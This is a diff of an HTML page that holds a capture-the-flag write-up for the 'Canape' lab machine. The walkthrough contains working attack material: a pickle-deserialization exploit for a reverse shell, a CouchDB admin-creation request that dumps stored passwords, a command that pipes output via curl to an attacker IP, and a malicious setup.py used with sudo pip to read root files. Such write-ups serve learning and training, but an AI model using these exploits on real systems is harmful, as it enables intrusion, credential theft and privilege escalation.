@@ -40,8 +40,7 @@
 
     </script>
     <script src="../../../js/base.js"></script>
-      <script src="../../../search/require.js"></script>
-      <script src="../../../search/search.js"></script> 
+      <script src="../../../search/main.js"></script> 
 </head>
 
 <body>
@@ -57,7 +56,6 @@ if (is_top_frame) { $('body').addClass('wm-top-page'); }
 
     
     
-      
       
     
 
@@ -89,9 +87,8 @@ if (is_top_frame) { $('body').addClass('wm-top-page'); }
 <h2 id="user">User</h2>
 <p>This was my favorite machine so far. Thanks: @overcast!.
 So, as always, lets start with nmap:</p>
-<pre><code class="bash">$&gt; nmap -sC -sV 10.10.10.70  &gt; nmap
+<pre><code class="language-bash">$&gt; nmap -sC -sV 10.10.10.70  &gt; nmap
 </code></pre>
-
 <p>And here is the output:</p>
 <p><img alt="nmap canape" src="../images/canape/nmap.png" /></p>
 <p>Great, while we go to the HTTP server, I'll let an nmap full scan running..
@@ -99,9 +96,8 @@ Once we connect to the HTTP server we find some stuff related with The Simpsons,
 Looking to the source code of the main page, we find this: </p>
 <p><img alt="commit source code" src="../images/canape/hash_commit_source_code.png" /></p>
 <p>Ok..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a <strong>.git</strong> directory, so I proceed to download it: </p>
-<pre><code class="bash">$&gt; wget --recursive --no-parent http://10.10.10.70/.git/
+<pre><code class="language-bash">$&gt; wget --recursive --no-parent http://10.10.10.70/.git/
 </code></pre>
-
 <p>Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.</p>
 <p><img alt="logs" src="../images/canape/git_logs.png" /></p>
 <p>Just in a few words, this application had to main entrypoints:</p>
@@ -112,21 +108,19 @@ Looking to the source code of the main page, we find this: </p>
 <p>I searched for some tutorials of how to exploit this and fortunately I found a couple of them. </p>
 <p>So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.</p>
 <p>I started to go back on my steps, and figured it out something crucial. The <strong>submit</strong> endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character &amp; quote content: </p>
-<pre><code class="python">...
+<pre><code class="language-python">...
 p_id = base64.b64encode(char + quote)[:10]
 ...
 </code></pre>
-
 <p>Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash 
 of the concatenation:</p>
 <pre><code>git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1
     -    p_id = base64.b64encode(char + quote)[:10]
     +    p_id = md5(char + quote).hexdigest()
 </code></pre>
-
 <p>So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. </p>
 <p>This was final version of the python application:</p>
-<pre><code class="python">import string
+<pre><code class="language-python">import string
 import random
 import base64
 import cPickle
@@ -211,10 +205,9 @@ def check():
 if __name__ == &quot;__main__&quot;:
     app.run(host=&quot;0.0.0.0&quot;)
 </code></pre>
-
 <p>(it may be a little modified, but the core parts are there.)
 So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: </p>
-<pre><code class="python">import requests
+<pre><code class="language-python">import requests
 #import base64
 from hashlib import md5
 
@@ -257,7 +250,6 @@ if __name__ == &quot;__main__&quot;:
     id_code = submit_exploit(cmd)
     check_and_run_exploit(id_code)
 </code></pre>
-
 <p>Two disclaimers:</p>
 <ul>
 <li>The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).</li>
@@ -271,12 +263,11 @@ Once inside the machine, my first move was to run <strong>LinEnum.sh</strong>. O
 <p>I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a <strong>BIG</strong> troll.</p>
 <p>Analyzing the applications running on the system and its ports, I found the <strong>couchdb</strong> running in localhost. 
 I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: </p>
-<pre><code class="bash">$&gt; curl -X GET http://localhost:5984
+<pre><code class="language-bash">$&gt; curl -X GET http://localhost:5984
 {&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;2.0.0&quot;,&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
 </code></pre>
-
 <p>I started playing around a little more and figured it out how to list dbs and docs inside them: </p>
-<pre><code class="bash">$&gt; curl -X GET http://localhost:5984/_all_dbs
+<pre><code class="language-bash">$&gt; curl -X GET http://localhost:5984/_all_dbs
 [&quot;_global_changes&quot;,&quot;_metadata&quot;,&quot;_replicator&quot;,&quot;_users&quot;,&quot;passwords&quot;,&quot;simpsons&quot;]
 $&gt; curl -X GET http://localhost:5984/simpsons/_all_docs
 {&quot;total_rows&quot;:7,&quot;offset&quot;:0,&quot;rows&quot;:[
@@ -290,10 +281,9 @@ $&gt; curl -X GET http://localhost:5984/simpsons/_all_docs
 $&gt; curl -X GET http://localhost:5984/passwords/_all_docs
 {&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not a server admin.&quot;}
 </code></pre>
-
 <p>So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this <strong>EXCELENT</strong> <a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">blogpost</a>. Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).</p>
 <p>I changed (just the names) a little bit the PoC of the blog and executed against the db: </p>
-<pre><code class="bash">$&gt; curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
+<pre><code class="language-bash">$&gt; curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
   &quot;type&quot;: &quot;user&quot;,
   &quot;name&quot;: &quot;tsuller&quot;,
   &quot;roles&quot;: [&quot;_admin&quot;],
@@ -302,9 +292,8 @@ $&gt; curl -X GET http://localhost:5984/passwords/_all_docs
 }'
 {&quot;ok&quot;:true,&quot;id&quot;:&quot;org.couchdb.user:tsuller&quot;,&quot;rev&quot;:&quot;1-0b547bb36cb610ec21d9571312f6e20c&quot;}
 </code></pre>
-
 <p>Yes! Seems that it worked! Lets check:</p>
-<pre><code class="bash">$&gt; curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs
+<pre><code class="language-bash">$&gt; curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs
 {&quot;total_rows&quot;:4,&quot;offset&quot;:0,&quot;rows&quot;:[
 {&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;}},
 {&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;}},
@@ -312,9 +301,8 @@ $&gt; curl -X GET http://localhost:5984/passwords/_all_docs
 {&quot;id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;key&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;}}
 ]}
 </code></pre>
-
 <p>YES! Worked. Lets dump the content of each doc:</p>
-<pre><code class="bash">$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+<pre><code class="language-bash">$&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
 {&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc4380019e4&quot;,&quot;_rev&quot;:&quot;2-81cf17b971d9229c54be92eeee723296&quot;,&quot;item&quot;:&quot;ssh&quot;,&quot;password&quot;:&quot;0B4jyA0xtytZi7esBNGp&quot;,&quot;user&quot;:&quot;&quot;}
 $&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
 {&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc43800368d&quot;,&quot;_rev&quot;:&quot;2-43f8db6aa3b51643c9a0e21cacd92c6e&quot;,&quot;item&quot;:&quot;couchdb&quot;,&quot;password&quot;:&quot;r3lax0Nth3C0UCH&quot;,&quot;user&quot;:&quot;couchy&quot;}
@@ -323,25 +311,22 @@ $&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8
 $&gt; curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
 {&quot;_id&quot;:&quot;739c5ebdf3f7a001bebb8fc438004738&quot;,&quot;_rev&quot;:&quot;1-49a20010e64044ee7571b8c1b902cf8c&quot;,&quot;user&quot;:&quot;homerj0121&quot;,&quot;item&quot;:&quot;github&quot;,&quot;password&quot;:&quot;STOP STORING YOUR PASSWORDS HERE -Admin&quot;}
 </code></pre>
-
 <p>If we pay atenttion to the <strong>home</strong> directory, we'll just find <strong>homer</strong> user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the <strong>ssh</strong> one) worked, and seconds later I was able to get the user flag: </p>
 <p><img alt="user_flag" src="../images/canape/user_flag.png" /></p>
 <h2 id="root">Root</h2>
 <p>To start, I ran again the <strong>LinEnum.sh</strong> but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.</p>
 <p>In some moment, I thought that the couchdb was running as <strong>root</strong>. I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also <strong>couchy</strong> (look the docs of the <strong>password</strong> db) was admin. 
 Thanks to this <a href="https://www.octority.com/2017/05/16/from-couchdb-admin-to-remote-code-execution/">blogpost</a> first, and a little help from <a href="https://stackoverflow.com/questions/37401355/cant-create-server-admin-in-couchdb">this</a> also I was able to successfully execute commands: </p>
-<pre><code class="bash">curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '&quot;whoami | curl http://10.10.14.255:5555 -d @-&quot;'  --insecure
+<pre><code class="language-bash">curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '&quot;whoami | curl http://10.10.14.255:5555 -d @-&quot;'  --insecure
 curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure
 curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{&quot;_id&quot;:&quot;770855a97726d5666d70a22173005c77&quot;}' --insecure
 curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}' -H 'Content-Type: application/json' --insecure
 </code></pre>
-
 <p>Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the <strong>whoami</strong> wasn't root but homer. I must have confused with some other running process. </p>
 <p>I continued looking for some interesting thing, but nothing showed up. </p>
 <p>During that search, I issued: </p>
-<pre><code class="bash">sudo -l 
+<pre><code class="language-bash">sudo -l 
 </code></pre>
-
 <p>And this was the output:
 ![sudoers][./images/canape/sudoers.png]</p>
 <p>For those not very familiar, this means that the user <strong>homer</strong> can run as <strong>root</strong> the command <strong>pip install</strong> without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?</p>
@@ -352,16 +337,14 @@ curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?li
 <li>Decompressed it.</li>
 <li>Added the following line to the setup.py:</li>
 </ul>
-<pre><code class="python">os.system('cat /root/root.txt &gt; /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')
+<pre><code class="language-python">os.system('cat /root/root.txt &gt; /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')
 </code></pre>
-
 <p>(I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)
-<em> Compressed it again.
-</em> Served it in a python serve so you can copy it to the machine .
+* Compressed it again.
+* Served it in a python serve so you can copy it to the machine .
 * Executed:</p>
-<pre><code class="bash">sudo /usr/bin/pip install blablabla.tar.gz
+<pre><code class="language-bash">sudo /usr/bin/pip install blablabla.tar.gz
 </code></pre>
-
 <ul>
 <li>Read the flag from <strong>/tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p</strong></li>
 <li>Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.</li>
